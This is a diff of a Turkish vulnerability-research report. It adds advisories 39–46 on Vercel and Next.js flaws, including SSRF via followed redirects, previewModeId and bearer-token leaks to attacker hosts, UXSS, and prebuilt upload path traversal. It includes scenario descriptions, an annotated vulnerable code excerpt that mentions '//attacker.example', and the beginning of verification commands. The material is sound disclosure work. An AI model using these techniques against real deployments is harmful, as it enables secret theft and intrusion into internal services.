@@ -7,7 +7,7 @@
 Bu kapsamlı teknik kılavuz ve güvenlik araştırma raporu üç ana bölümden oluşmaktadır:
 1. **Bölüm I — macOS (Apple Silicon) Gerçek Donanım Kurulum ve Çalışma Doğrulama Raporu:** Sniper Community'nin gerçek macOS donanımı üzerinde hem **yerel kaynak kurulumu (`--core-only`)** hem de **Docker Desktop beş motorlu (`community-tools`)** kurulumu ile uçtan uca test ve doğrulama sonuçları.
 2. **Bölüm II — Sniper ile Taranan 8 Açık Kaynak Depo, Zafiyet Dönüşüm Mekanizmaları ve Günlük Hayat Senaryoları:** **Gökçe Baran Karakamış** tarafından **Sniper** statik analiz (SAST), altyapı (IaC) ve bağımlılık (SCA) denetim motoru ile taranan **8 açık kaynak deponun** kaynak kodu düzeyinde incelenmesi, yanlış pozitif ayrımı, kod hatalarının hangi koşullarda zafiyete dönüştüğünün herkesin anlayabileceği dilde açıklanması, her depo için **3 gerçek hayat senaryosu (`Senaryo A / B / C`)** ve **örnek çalıştırma/doğrulama komutları**.
-3. **Bölüm III — Kendi Sniper Taramamızda Bulduğumuz 38 Doğrulanmış Güvenlik Kaydı (`01`..`38`: 37 Özgün Açık + 1 Üst Akış Duplicate), Kod Analizi, Senaryolar ve Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`):** 6 farklı açık kaynak projede (**Stirling-PDF, TryCua `cua`, OpenZiti, n8n, Gotify Server, NIIS X-Road**) keşfedilen ve GitHub Security Advisory (`GHSA`) olarak bildirilen **11 doğrulanmış güvenlik açığının** kodda nasıl oluştuğu, adım adım nasıl zafiyete dönüştüğü, her biri için **3 somut günlük hayat kritik senaryosu (`Senaryo A / B / C`)**, **örnek çalıştırma/tetikleme komutları** ve **savunma yamaları (`git diff`)**.
+3. **Bölüm III — Kendi Sniper Taramamızda Bulduğumuz 46 Doğrulanmış Güvenlik Kaydı (`01`..`46`: 45 Özgün Açık + 1 Üst Akış Duplicate), Kod Analizi, Senaryolar ve Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`):** 6 farklı açık kaynak projede (**Stirling-PDF, TryCua `cua`, OpenZiti, n8n, Gotify Server, NIIS X-Road**) keşfedilen ve GitHub Security Advisory (`GHSA`) olarak bildirilen **11 doğrulanmış güvenlik açığının** kodda nasıl oluştuğu, adım adım nasıl zafiyete dönüştüğü, her biri için **3 somut günlük hayat kritik senaryosu (`Senaryo A / B / C`)**, **örnek çalıştırma/tetikleme komutları** ve **savunma yamaları (`git diff`)**.
 
 ---
 
@@ -489,9 +489,9 @@ python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json"
 
 ---
 
-## Bölüm III — Kendi Sniper Taramamızda Bulduğumuz Doğrulanmış Açıklar (38 Doğrulanmış Güvenlik Kaydı (37 Özgün Açık + 1 Üst Akış Duplicate), Zafiyete Dönüşüm Mekanizmaları, Senaryolar ve Örnek Çalıştırma Komutları)
+## Bölüm III — Kendi Sniper Taramamızda Bulduğumuz Doğrulanmış Açıklar (46 Doğrulanmış Güvenlik Kaydı (45 Özgün Açık + 1 Üst Akış Duplicate), Zafiyete Dönüşüm Mekanizmaları, Senaryolar ve Örnek Çalıştırma Komutları)
 
-**Sniper** statik/dinamik analiz motoru ile yürüttüğümüz güvenlik taramalarında tespit edilen, **Adım Adım Günlük Hayat Kritik Senaryoları (`Senaryo A / B / C`)**, **Uçtan Uca Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`)** ve **Doğrulanmış Savunma Yamaları (`git diff`)** ile kanıtlanan **38 güvenlik kaydı (37 özgün açık + 1 üst akış duplicate)** ([advisories/README.tr.md](advisories/README.tr.md)) aşağıda önce özet tablo halinde, hemen ardından ise **her bir açığın kodda nasıl oluştuğunu, adım adım nasıl zafiyete dönüştüğünü, 3 günlük hayat kritik senaryosunu ve örnek çalıştırma/doğrulama komutlarını** içeren kapsamlı teknik bölümler (`III.01` – `III.38`) halinde sunulmuştur:
+**Sniper** statik/dinamik analiz motoru ile yürüttüğümüz güvenlik taramalarında tespit edilen, **Adım Adım Günlük Hayat Kritik Senaryoları (`Senaryo A / B / C`)**, **Uçtan Uca Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`)** ve **Doğrulanmış Savunma Yamaları (`git diff`)** ile kanıtlanan **46 güvenlik kaydı (45 özgün açık + 1 üst akış duplicate)** ([advisories/README.tr.md](advisories/README.tr.md)) aşağıda önce özet tablo halinde, hemen ardından ise **her bir açığın kodda nasıl oluştuğunu, adım adım nasıl zafiyete dönüştüğünü, 3 günlük hayat kritik senaryosunu ve örnek çalıştırma/doğrulama komutlarını** içeren kapsamlı teknik bölümler (`III.01` – `III.46`) halinde sunulmuştur:
 
 | # | Açık / Advisory & GHSA Bağlantısı | Hedef Proje & Bileşen | CWE & CVSS v3.1 | Günlük Hayatta Yol Açtığı Kritik Senaryolar (`Senaryo A / B / C`) | Çalışma Zamanı Kanıtı (`RED -> GREEN`) |
 | :-: | :--- | :--- | :--- | :--- | :--- |
@@ -533,6 +533,14 @@ python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json"
 | **36** | [`36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md`](advisories/tr/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md)<br/>`CHIA-POS-02..04`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chiapos** (`<= 2.0.11`)<br/>`src/verifier.hpp:48-108` (`Verifier::ValidateProof`)<br/>`src/bits.hpp:184`<br/>`src/prover_disk.hpp:254-322` (`DiskProver`) | `CWE-190 / CWE-787 / CWE-125`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` | **Kodda Oluşumu:** `Verifier::ValidateProof` (`src/verifier.hpp`, `src/bits.hpp:184`) `k=50` (Tablo 4) ve `k>=60` için yığın sınırını aşar; `DiskProver` (`src/prover_disk.hpp`) 64-bit tablo boyutunu 32-bite daraltır.<br/>**Senaryo A (`.plot` Dosyası Heap Taşması):** Zararlı `.plot` dosyası C++ heap taşması tetikler.<br/>**Senaryo B (`k=50` / `k=60` ASan/UBSan Kanıtı):** `chiapos_k_probe` ikilisinde `src/bits.hpp:184` sınır aşımı (`exit_code=1`).<br/>**Senaryo C (`GREEN` Yaması):** Sınır kontrolüyle `exit_code=0` döner. | `RED`: `k50_table4_asan_exit: 1, k60_asan_exit: 1 (src/bits.hpp:184 OOB)`<br/>`GREEN`: `exit_code: 0, rejected_cleanly: true`<br/>`pytest -k chiapos` |
 | **37** | [`37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md`](advisories/tr/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md)<br/>`CHIA-VDF-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chiavdf** (`<= 1.1.11`)<br/>`src/verifier.cpp` (`CheckProofOfTimeNWesolowski`)<br/>`src/prover_slow.h` | `CWE-125 / CWE-416`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **Kodda Oluşumu:** `CheckProofOfTimeNWesolowski` (`src/verifier.cpp`), `proof_blob_len` ve `num_iterations > 0` kontrolü yapmadan segment okur.<br/>**Senaryo A (Doğrulayıcı OOB Çöküşü):** Kısa VDF kanıtı C++ sınır dışı okuma hatası üretir.<br/>**Senaryo B (Teardown UAF):** `prover_slow.h` içinde serbest bırakılmış belleğe erişilir.<br/>**Senaryo C (`GREEN` Yaması):** Bozuk VDF kanıtını `false` ile güvenle reddeder. | `RED`: `asan_oob_or_segv: true, exit_code: 1`<br/>`GREEN`: `asan_oob_or_segv: false, verified: false`<br/>`chiavdf ASan harness` |
 | **38** | [`38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md`](advisories/tr/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md)<br/>`CHIA-DL-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/data_layer/download_data.py`<br/>`chia/data_layer/data_layer.py` | `CWE-918`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **Kodda Oluşumu:** `download_data.py`, DataLayer ayna URL'lerini indirirken `30x` yönlendirme hedeflerini `127.0.0.1` / özel IP aralıklarına karşı doğrulamaz.<br/>**Senaryo A (İç Ağ ve Metadata SSRF):** `302` yönlendirmesiyle abone sunucunun `127.0.0.1` / `169.254.169.254` servislerine erişilir.<br/>**Senaryo B (Kopya Düğümler Üzerinden Tarama):** Abone düğümler iç ağ hedeflerine istek gönderir.<br/>**Senaryo C (`GREEN` Yaması):** Özel/loopback IP yönlendirmelerini engeller. | `RED`: `redirect_to_loopback_followed: true, internal_hit_count: 1`<br/>`GREEN`: `redirect_to_loopback_followed: false, internal_hit_count: 0`<br/>`pytest -k dl02` |
+| **39** | [`39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)<br/>`VERCEL-NEXT-15`<br/>MITRE CNA-LR & HackerOne #4152250 (+2 Follow-Up Comments Mounted) | **vercel/next.js** (`next <= 16.4.3`)<br/>`packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`<br/>`packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201` | `CWE-200 / CWE-918 / CWE-345`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` | **Kodda Oluşumu:** `createRedirectRenderResult()` (`action-handler.js:278-303`) iç `fetch()` çağrısında `redirect: 'manual'` kullanmaz; dış `302` yönlendirmelerini `x-next-revalidate-tag-token` (`previewModeId`) ile takip eder ve dış RSC Flight yanıtını aynı kökenli `x-action-redirect` altında tarayıcıya aktarır (`"b"` alanı bırakıldığında `server-action-reducer.js:161` Build ID kontrolü atlanır -> `UXSS`).<br/>**Senaryo A (SSO/OIDC `previewModeId` Sızıntısı):** Çok kiracılı SSO girişinde `previewModeId` dış IdP'ye sızar.<br/>**Senaryo B (Küresel ISR Önbellek Sıfırlama):** Çalınan anahtar `x-prerender-revalidate` ile önbelleği siler.<br/>**Senaryo C (Aynı Kökenli RSC Flight UXSS):** Dış `302` yanıtı sahte Virtual DOM ve CORS başlıklarını `victim-app.com`'a enjekte eder. | `RED`: `leaked_previewModeId: f5dbbd8f6a6a51a6aa8ff1443f7090dd, client_build_id_check_bypassed: true, flight_uxss: true`<br/>`GREEN`: `redirect: 'manual', external_hop_followed: false`<br/>HackerOne `#4152250` (+2 Comments) |
+| **40** | [`40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/tr/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)<br/>`VERCEL-NEXT-09`<br/>MITRE CNA-LR & HackerOne #4152265 (+2 Follow-Up Comments Mounted) | **vercel/next.js** (`next <= 16.4.3`)<br/>`packages/next/src/server/image-optimizer.ts:696-729`<br/>`packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`) | `CWE-918 / CWE-863`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **Kodda Oluşumu:** `fetchExternalImage()` (`image-optimizer.js:586-615`), `remotePatterns` kontrolünü `3xx` yönlendirmelerinde tekrarlamaz (`09A`). `isPrivateIp(ip)` fonksiyonu Linux tireli IPv6 zone indekslerinde (`::ffff:127.0.0.1%br-...`) fail-open (`return false`) yapar ve `::7f00:1` ile `64:ff9b:1::/48` adreslerini `unicast` sayar (`09B`).<br/>**Senaryo A (Aynı Sunucu Dizin Atlaması):** `/public-avatars/**` üzerinden `/private-kyc-docs/passport-scan.png` okunur.<br/>**Senaryo B (Farklı Sunucu İzin Listesi Atlaması):** İzinli CDN'den iç sunucuya sıçranır.<br/>**Senaryo C (`09A -> 09B` Doğrudan `127.0.0.1` Loopback SSRF):** `::ffff:127.0.0.1%br-...` üzerinden `127.0.0.1` soketine bağlanılır. | `RED`: `remotePatterns_bypassed: true, loopback_server_hit: true, remote_addr: ::ffff:127.0.0.1`<br/>`GREEN`: `redirect_rechecked: true, fail_closed: true`<br/>HackerOne `#4152265` (+2 Comments) |
+| **41** | [`41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)<br/>`VERCEL-CLI-07`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`vercel <= 65.4.0`)<br/>`packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`<br/>`packages/cli/src/commands/http-cli/index.ts` | `CWE-200 / CWE-436`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` | **Kodda Oluşumu:** `constructFullUrl()` (`packages/cli/src/commands/curl/utils.ts:179-216`), `new URL()` ile köken kontrolü yapıp ham `${baseUrl}${normalizedPath}` dizgesini döndürür. `\\@attacker.com` girdisinde `libcurl`, `baseUrl\\` kısmını kullanıcı adı, `attacker.com`'u hedef sunucu olarak ayrıştırır.<br/>**Senaryo A (CI/CD Sır Sızıntısı):** `vercel curl`, `Authorization: Bearer` ve `x-vercel-protection-bypass` başlıklarını dış sunucuya gönderir.<br/>**Senaryo B (Geliştirici/Ajan CLI Sızıntısı):** Zararlı yol parametresi canlı CLI anahtarını çalar.<br/>**Senaryo C (Otomatik Üretilen Bypass Sırrı):** `PATCH /v10/projects/{id}/protection-bypass` ile üretilen sır dışarı sızar. | `RED`: `whatwg_origin_check_passed: true, curl_connected_to_attacker: true, leaked_bearer: true`<br/>`GREEN`: `rejected_backslash_and_globoff: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
+| **42** | [`42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/tr/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)<br/>`VERCEL-FLAGS-CORE-06`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/flags** (`@vercel/flags-core <= 1.10.2`)<br/>`packages/flags-core/src/controller.ts:555-615`<br/>`packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`) | `CWE-400 / CWE-345`<br/>**6.5 Medium**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` | **Kodda Oluşumu:** `Controller.streamResponse()` (`controller.ts:555-615`), `res.ok` ve veri dosyası gövdesini doğrulamadan `x-datafile-Updated-At` başlığıyla `datafileUpdatedAtWatermark` değerini günceller.<br/>**Senaryo A (Kill-Switch Kilidi):** `9999999999999` değeri tüm yeni bayrak güncellemelerinin reddedilmesine yol açar.<br/>**Senaryo B (`redirect: 'manual'` Eksikliği):** Akış isteği `3xx` yönlendirmelerini takip eder.<br/>**Senaryo C (Kalıcı Durum Donması):** Sunucu yeniden başlatılana kadar eski bayrakta kalır. | `RED`: `poisoned_watermark: 9999999999999, bundled_update_ignored: true`<br/>`GREEN`: `requires_res_ok_and_bounded_skew: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
+| **43** | [`43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/tr/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)<br/>`VERCEL-FLAGS-05`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/flags** (`flags <= 4.4.0`)<br/>`packages/flags/src/next/precompute.ts:206-214`<br/>`packages/flags/dist/next/index.js:119-125` (`deserialize`) | `CWE-347`<br/>**6.5 Medium**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` | **Kodda Oluşumu:** `deserialize(flags, code, secret)` (`precompute.ts:206-214`), `flags.length > 0` olsa bile `code === '__no_flags__'` olduğunda JWS imzasını doğrulamadan `{}` döndürür.<br/>**Scenario A (Edge Kısıtlama Atlaması):** `/__no_flags__/page` isteği JWS kontrolünü atlar ve `flag.decide()` geri dönüşünü tetikler.<br/>**Senaryo B (Kohort Sıfırlama):** İmza anahtarı bilinmeden imzalı kohort sıfırlanır.<br/>**Senaryo C (Sunucu Yükü):** Her istekte `decide()` yeniden çalıştırılır. | `RED`: `deserialize('__no_flags__'): {}, getPrecomputed_bypassed_edge_false_to_true: true`<br/>`GREEN`: `requires_flags_length_zero_for_sentinel: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
+| **44** | [`44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)<br/>`VERCEL-FIREWALL-01`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/firewall** (`@vercel/firewall <= 1.2.6`)<br/>`packages/firewall/src/rate-limit.ts:138-183, 211-285`<br/>`cmd/ipc-proxy/client.go:34-41, 79-97` | `CWE-918 / CWE-200 / CWE-636`<br/>**7.2 High**<br/>`AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N` | **Kodda Oluşumu:** `resolveFirewallHost()` (`rate-limit.ts:138-167`), `VERCEL_ENV !== 'production'` iken gelen `Host` başlığına `x-vercel-rate-limit-secret` ve `x-vercel-oidc-token` gönderir; hata durumunda `{ rateLimited: false }` ile fail-open yapar.<br/>**Senaryo A (Sır Sızıntısı):** Sahte `Host` başlığı `VF_RATE_LIMIT_SECRET` anahtarını çalar.<br/>**Senaryo B (Fail-Open Hız Sınırı Atlama):** Hatalı `Host` ile `{ rateLimited: false }` alınarak OTP/parola sınırı aşılır.<br/>**Senaryo C (Go `ipc-proxy` `%s` Hatası):** `client.go:38` içinde `fmt.Sprintf` eksikliği. | `RED`: `leaked_rate_limit_secret: rl_secret_LIVE_99887766, fail_open_rateLimited: false`<br/>`GREEN`: `strict_hostname_regex_and_sprintf_fixed: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
+| **45** | [`45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/tr/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)<br/>`VERCEL-CLIENT-08A`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`@vercel/client <= 18.10.0`)<br/>`packages/client/src/utils/hashes.ts:115-167`<br/>`packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`) | `CWE-200 / CWE-706`<br/>**5.0 Medium**<br/>`AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N` | **Kodda Oluşumu:** `filesFromFilePathMap()` (`packages/client/src/utils/hashes.ts:115-167`), `.vc-config.json` `filePathMap` girdilerini kök dizin veya `.vercelignore` kontrolü yapmadan `path.resolve(cwd, filePath)` ile okur ve yükler.<br/>**Senaryo A (`.next/required-server-files.json` Sızıntısı):** `.vercelignore`'a rağmen yerel `.env` sırları yüklenir.<br/>**Senaryo B (CI Prebuilt Traversal):** `filePathMap` içindeki `../../` yolları konak dosyalarını `/v2/files`'a yükler.<br/>**Senaryo C (Önbellek Zehirlemesi):** `.vc-config.json` ile runner sırları sızdırılır. | `RED`: `outside_host_secret_uploaded: true, dotnext_env_secret_uploaded: true`<br/>`GREEN`: `path_confined_to_cwd: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
+| **46** | [`46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/tr/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)<br/>`VERCEL-CLIENT-08B`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`@vercel/client <= 18.10.0`)<br/>`packages/client/src/utils/index.ts:116-148`<br/>`packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`) | `CWE-59 / CWE-200`<br/>**5.0 Medium**<br/>`AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N` | **Kodda Oluşumu:** `buildFileTree()` (`packages/client/src/utils/index.ts:116-148`), `config.bulkRedirectsPath` dizinini `fs.realpath()` sınır kontrolü ve `.vercelignore` filtresi olmadan tarar; sembolik bağları takip eder.<br/>**Senaryo A (Symlink Kaçışı):** Sembolik bağ ile proje dışı konak dosyaları dağıtıma yüklenir.<br/>**Senaryo B (`../` Dizin Tarama):** Üst dizin yolu ile dış klasörler yüklenir.<br/>**Senaryo C (`.vercelignore` Atlaması):** Hariç tutulan sır dosyaları yüklenir. | `RED`: `symlink_target_outside_cwd_uploaded: true`<br/>`GREEN`: `realpath_confinement_and_lstat_enforced: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
 
 ---
 
@@ -3126,3 +3134,603 @@ grep -n -C 10 "session.get" /home/community-user/targets/chia-blockchain/chia/da
 ```
 
 <!-- CHIA-ADVISORIES-END -->
+
+<!-- VERCEL-ADVISORIES-START -->
+
+---
+
+### III.39 — vercel/next.js (`next <= 16.4.3 (verified on published npm next@16.4.3 & canary)`) — Next.js App Router Server Action Dahili `redirect()` SSRF, `previewModeId` (`x-next-revalidate-tag-token`) Gizli Anahtar Sızıntısı ve Build-ID Atlamalı Aynı Kökenli RSC Flight UXSS (`VERCEL-NEXT-15` / HackerOne `#4152250`) (`CWE-200 / CWE-918 / CWE-345`, CVSS `8.2 High`)
+
+#### 1. Üst Veri & Bildirim Durumu
+* **Hedef Depo & Paket:** `vercel/next.js` (`npm / Node.js: next`)
+* **Etkilenen Sürüm & Bileşenler:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`, `packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201`
+* **Zafiyet Sınıfı & Skor:** `CWE-200 / CWE-918 / CWE-345` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`)
+* **Sniper Tekil Raporu:** [`docs/advisories/tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)
+
+#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
+1. **Adım 1 — `createRedirectRenderResult()` İçinde Eksik `redirect: 'manual'` ve Şema-Bağıl (`//host`) URL Kabulü (`action-handler.js:270-303`):** `forwardActionToWorker()` fonksiyonu `redirect: 'manual'` (satır 175) kullanırken, hemen altındaki `createRedirectRenderResult()` fonksiyonu `await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } })` çağrısını varsayılan `redirect: 'follow'` ile çalıştırır.
+2. **Adım 2 — `x-next-revalidate-tag-token` (`previewModeId`) Anahtarının Dış `302` Yönlendirmelerine Otomatik Sızdırılması (`action-handler.js:904-911`):** Bir Server Action `revalidateTag()`, `revalidatePath()` veya `updateTag()` sonrasında `redirect('/api/sso-callback')` çağırdığında, `handleAction()` iç isteğe `x-next-revalidate-tag-token: store.previewProps.previewModeId` başlığını ekler. Üstelik `revalidateTag()` çağrılmasa bile `createRedirectRenderResult()` her `redirect('/internal-path')` çağrısında dış `302` hedefini sunucu tarafında takip eder.
+3. **Adım 3 — Monte Edilen HackerOne Yorumu #1 (`RE-EVALUATION-COMMENT-4152250`): Build-ID Kontrolünü Atlayarak Aynı Kökenli RSC Flight Enjeksiyonu (`UXSS`) ve HTTP Yanıt Başlığı Enjeksiyonu:** `handleAction()`, `createRedirectRenderResult()` çağrısından ÖNCE `x-action-redirect: /api/oauth-bounce;push` başlığını ayarladığı için tarayıcı yanıtı aynı kökenli (`same-origin`) kabul eder. İstemci tarafındaki `server-action-reducer.js:161-162` (`if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId())`), dış sunucunun döndürdüğü sahte RSC Flight yanıtında `"b"` alanı bırakılmadığında (`undefined`) Build ID doğrulamasını tamamen atlar ve saldırganın `dangerouslySetInnerHTML` yükünü doğrudan `https://victim-app.com` DOM'una monte ederek **Universal XSS (`UXSS`)** oluşturur!
+4. **Adım 4 — Monte Edilen HackerOne Yorumu #2 (`ADDENDUM-SCENARIOS-4152250`): Ayrı Bir Open-Redirect Hatası Olmadan Tasarım Gereği Dış `302` Döndüren Gerçek Next.js Mimarileri:** Çok kiracılı (Multi-Tenant) kurumsal B2B SSO/OIDC giriş akışları (`/api/sso/authorize?tenant=attacker-corp.com`), OAuth 2.0 sağlayıcı onay uç noktaları (`/api/oauth/complete`) ve ödeme/tıklama yönlendiricileri tasarım gereği dış `302` yanıtı üretir.
+
+```javascript
+// 1. Server-side internal redirect fetch WITHOUT redirect: 'manual'
+// File: node_modules/next/dist/esm/server/app-render/action-handler.js (lines 270-303)
+function getAppRelativeRedirectUrl(redirectUrl, basePath, i18n) {
+    if (redirectUrl.startsWith('/')) { // BUG: accepts '//attacker.example' and internal routes that 302 externally
+        return `${basePath}${redirectUrl}`;
+    }
+    return new URL(redirectUrl).pathname;
+}
+async function createRedirectRenderResult(req, res, originalHost, redirectUrl, basePath, staticGenerationStore, workUnitStore) {
+    const fetchUrl = new URL(formattedUrl, `http://localhost:${port}`);
+    // BUG: Missing `redirect: 'manual'`! Undici follows 3xx hops to external hosts while carrying
+    // x-next-revalidate-tag-token (previewModeId) and pipes external Flight body + headers to res!
+    const response = await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } });
+    if (response.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER) {
+        copyResponseHeaders(response, res);
+        return new FlightRenderResult(response.body);
+    }
+}
+
+// 2. Client-side Build ID validation skipped when 'b' is omitted (`responseBuildId === undefined`)
+// File: node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js (lines 154-201)
+let redirectFlightData = await createFromNextReadableStream(res.body, ...);
+const { b: responseBuildId, f: flightData } = redirectFlightData;
+if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId()) {
+    return handleExternalUrl(state, mutable, action.mutable.redirectLocation, state.pushRef.pendingPush);
+}
+```
+
+#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
+* **Senaryo A — Çok Kiracılı Kurumsal SSO / OAuth Giriş Akışında `previewModeId` Gizli Anahtarının Çalınması (Monte Edilen HackerOne `#4152250` Senaryo A):** Kurumsal bir SaaS uygulaması (`https://victim-app.com`), giriş Server Action'ında `revalidateTag('auth-session')` ve `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)` çağırır; bu rota kiracının OIDC sağlayıcısına `302 Found` döndürür. Saldırgan `user@attacker-corp.com` girdiğinde Next.js `302`'yi sunucu içinde takip eder ve `x-next-revalidate-tag-token: <previewModeId>` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`) başlığını doğrudan saldırganın sunucusuna teslim eder.
+* **Senaryo B — Çalınan `previewModeId` İle Yetkisiz Küresel On-Demand ISR Önbellek Sıfırlama ve Veritabanı Hizmet Engelleme (Monte Edilen HackerOne `#4152250` Senaryo B):** `try-get-preview-data.js:34` dosyası `req.headers['x-prerender-revalidate'] === previewProps.previewModeId` kontrolü yaptığı için saldırgan çaldığı anahtarı `x-prerender-revalidate` başlığında göndererek tüm önbellekli ISR sayfalarını (`200 OK`, `x-nextjs-cache: REVALIDATED`) sıfırlar.
+* **Senaryo C — `revalidateTag()` Olmadan Bile Build-ID Atlamalı Aynı Kökenli RSC Flight Enjeksiyonu ve Universal XSS (`UXSS`) (Monte Edilen HackerOne `#4152250` Yorum #1 & Senaryo C):** Server Action `revalidateTag()` çağırmasa dahi `redirect('/api/oauth-bounce')` çalıştığında `x-action-redirect: /api/oauth-bounce;push` (aynı kökenli) başlığı yazılır ve dış sunucunun döndürdüğü `Content-Type: text/x-component` yanıtı (içinde `"b"` alanı olmadan) `server-action-reducer.js:161` Build ID kontrolünü atlayarak `https://victim-app.com` üzerinde tam **Universal XSS (`UXSS`)** ve keyfi HTTP yanıt başlığı enjeksiyonu (`Access-Control-Allow-Origin`, `Clear-Site-Data`) sağlar.
+
+#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
+```bash
+# 1. Inspect createRedirectRenderResult and server-action-reducer in next@16.4.3
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/app-render/action-handler.js | sed -n '270,305p'
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js | sed -n '154,201p'
+
+# 2. Run the Live next@16.4.3 End-to-End Verification Harness (Scenarios A, B, and C + Patch Check)
